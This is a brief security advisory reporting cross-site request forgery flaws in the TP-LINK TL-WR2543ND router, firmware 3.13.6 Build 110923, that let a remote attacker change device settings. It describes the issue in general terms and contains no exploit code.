TP-LINK TL-WR2543ND is prone to multiple cross-site request-forgery vulnerabilities because the application fails to properly validate HTTP requests.

Exploiting these issues may allow a remote attacker to change a device's configuration and perform other unauthorized actions.

TP-LINK TL-WR2543ND 3.13.6 Build 110923 is vulnerable; other versions may also be affected.
